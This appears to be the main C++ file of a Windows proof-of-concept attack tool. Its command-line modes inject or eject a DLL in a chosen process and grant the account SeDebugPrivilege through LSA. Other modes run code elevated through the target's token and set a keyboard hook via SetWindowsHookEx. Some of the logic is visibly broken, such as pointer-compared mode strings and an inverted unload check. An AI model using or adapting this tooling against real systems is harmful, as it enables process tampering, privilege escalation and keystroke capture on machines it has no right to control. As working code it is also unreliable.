#pragma once

#include "main.h"
#include "LSA_Privilege.h"
#include "InjectLib.h"
#include "EjectLib.h"
#include "Helper.h"
#include "Privileges.h"
#include "EnumLib.h"
#include "Hook.h"
#include "fProcess.h"


//Library needed by Linker to check file existance
#pragma comment(lib, "Shlwapi.lib")


using namespace std;


int _tmain(int argc, wchar_t* argv[])
{
	const wchar_t* mode;
	const wchar_t* procName;
	const wchar_t* dllName;


	//debug
	
	
	POC_EnumLib POC_EnumLib;

	if (argc == 4) {
		mode = argv[1];
		procName = argv[2];
		dllName = argv[3];
	}
	else
	{
		POC_Helper::ShowHelp();
		cin.get();
		return 0;
	}

	// Validate input
	if (mode == L"-e" || mode == L"-i" || mode == L"-h") {
		if (!PathFileExists(dllName)) {
			wprintf(L"dllName\\dllPath not found\n");
			return 0;
		}
	}



	// validate procName
	DWORD dwPID = 0xFFFFFFFF;
	bool bFindByName = false;
	try {
		dwPID = _wtoi(procName);
	}
	catch (...) {
		wprintf(L"\"%s\" is not PID, try to find by Name instead\n", procName);
		bFindByName = true;
	}

	// Wait for target process and get its PID
	if (bFindByName | dwPID == 0) {
		wprintf(L"Wait for process \"%s\"...\n", procName);

		while (1) {

			dwPID = POC_fProcess::FindProcessID(procName);

			if (dwPID == 0xFFFFFFFF)
			{
				wprintf(L"Target process \"%s\" not found\n", procName);
				return 0;
			}
			else {
				break;
			}
		}
	}
	wprintf(L"[+] Target PID is %d\n", dwPID);


	if (_tcscmp(mode, L"-i") == 0) {
		wprintf(L"==============\nInject Module\n==============\n");

		// Inject DLL
		if (POC_InjectLib::InjectLib(dwPID, dllName)) {
			wprintf(L"[+] DLL \"%s\" was injected to  the process %d\n", dllName, dwPID);
		} 
		else {
			wprintf(L"[-] Inject failed!!! ErrorCode = 0x%x\n", GetLastError());
			printf(POC_Helper::GetLastErrorAsString().c_str());
		}
	} 



	if (_tcscmp(mode, L"-u") == 0) {
		wprintf(L"==============\nUnload Module\n==============\n");

		int i = 1;
		do {

			// Eject DLL
			try {
				if (POC_EjectLib::EjectLib(dwPID, dllName)) {

					// Check if was really ejected
					Sleep(3000);		// wait 3 sec for fully unloaded
					MODULEENTRY32 fModule = { sizeof(fModule) };
					if (POC_EnumLib::EnumLib(dwPID, dllName, fModule)) {
						wprintf(L"[+] DLL \"%s\" was unloaded from process %d\n", dllName, dwPID);
					}
					else {
						wprintf(L"[-] EjectLib Success, but dll still loaded in the process\n");
					}
					i = 0;
				} 
				else {
					wprintf(L"[-] Eject failed!!! ErrorCode = 0x%x\n", GetLastError());
				}

			} 
			catch (int)
			{
				//try to get DEBUG privileges if Exception
				wprintf(L"[-] Eject crashed. Possible not enough privileges\n");
				wprintf(L"Try to get DEBUG privileges\n");
				if (!POC_Privileges::SetPrivilege(SE_DEBUG_NAME, TRUE))
				{
					wprintf(L"[-] Failed to get DEBUG privilege\n");
					i = 0;
				}
			}
			//cin >> i;
			//wprintf(L"\r\n");
		} while (i);
	}
	
	
	
	if (_tcscmp(mode, L"-c") == 0) {
		wprintf(L"==============\nCheck for Module\n==============\n");

		MODULEENTRY32 fModule = { sizeof(fModule) };
		int i = 1;
		do {
			try {
				if (!POC_EnumLib::EnumLib(dwPID, dllName, fModule))
				{
					wprintf(L"\n[-] Module not found\n");
					return FALSE;
				}
				else
				{
					wprintf(L"\n[+] Module Found!!!\n");
					return TRUE;
				}
			}
			catch (int)
			{
				wprintf(L"[-] Find Module crashed. Possible not enough privileges\n");

				//try to get DEBUG privileges
				wprintf(L"try to get DEBUG privileges\n");
				if (!POC_Privileges::SetPrivilege(SE_DEBUG_NAME, TRUE))
				{
					wprintf(L"[-]Failed to get DEBUG privilege\n");
					i = 0;
				}
			}
		} while (i);

		return TRUE;

	}
	
	
	if (_tcscmp(mode,L"-e") == 0) {

		wprintf(L"==============\nExecute Elevated\n==============\n");

		//try to get DEBUG privileges
		wprintf(L"Obtain DEBUG privileges...\n");
		
		if (POC_LSA_Privilege::LSA_isPresentPrivilege(SE_DEBUG_NAME)) {
			wprintf(L"Set DEBUG privilege for the process\n");
			if (!POC_Privileges::SetPrivilege(SE_DEBUG_NAME, TRUE))
			{
				wprintf(L"[-]Failed to get DEBUG privilege\n");
				return FALSE;
			}
		}
		else 
		{
			wprintf(L"[-]SeDebugPrivilege is not accessable for account\n");
			wprintf(L"Grant DEBUG privileges for account\n");
			if (POC_LSA_Privilege::LSA_AddPrivilege(SE_DEBUG_NAME)) {
				wprintf(L"[+]Privilege granted for account. Need to relogin\n!!!! Untill next gpupdate !!!!");
				return TRUE;
			}
			else
			{
				wprintf(L"[-]Failed to obtain DEBUG privilege\n");
				return FALSE;
			}
		}
		wprintf(L"[+] SeDebugPrivilege assigned to the process...\n");

		if (POC_Privileges::ElevatePrivilege(dwPID, dllName)) {
			wprintf(L"[+] Executed\n");
			return TRUE;
		}
		else
		{
			wprintf(L"[-] Failed to execute Elevated\n");
			return FALSE;
		}
	}

	if (_tcscmp(mode, L"-f") == 0) {

		wprintf(L"==============\nExecute Elevated\n==============\n");

		//try to get DEBUG privileges
		wprintf(L"Obtain DEBUG privileges...\n");

		if (POC_LSA_Privilege::LSA_isPresentPrivilege(SE_DEBUG_NAME)) {
			wprintf(L"Set DEBUG privilege for the process\n");
			if (!POC_Privileges::SetPrivilege(SE_DEBUG_NAME, TRUE))
			{
				wprintf(L"[-]Failed to get DEBUG privilege\n");
				return FALSE;
			}
		}
		else
		{
			wprintf(L"[-]SeDebugPrivilege is not accessable for account\n");
			wprintf(L"Grant DEBUG privileges for account\n");
			if (POC_LSA_Privilege::LSA_AddPrivilege(SE_DEBUG_NAME)) {
				wprintf(L"[+]Privilege granted for account. Need to relogin\n!!!! Untill next gpupdate !!!!");
				return TRUE;
			}
			else
			{
				wprintf(L"[-]Failed to obtain DEBUG privilege\n");
				return FALSE;
			}
		}
		wprintf(L"[+] SeDebugPrivilege assigned to the process...\n");

		if (POC_Privileges::ElevatePrivilege_SetThreadToken(dwPID, dllName)) {
			wprintf(L"[+] Executed\n");
			return TRUE;
		}
		else
		{
			wprintf(L"[-] Failed to execute Elevated\n");
			return FALSE;
		}
	}

	if (_tcscmp(mode, L"-h") == 0) {

		wprintf(L"==============\nSet Keyboard Hook\n==============\n");

		POC_Hook::demoSetWindowsHookEx(dwPID, procName, dllName);

	}


	return 1000;
}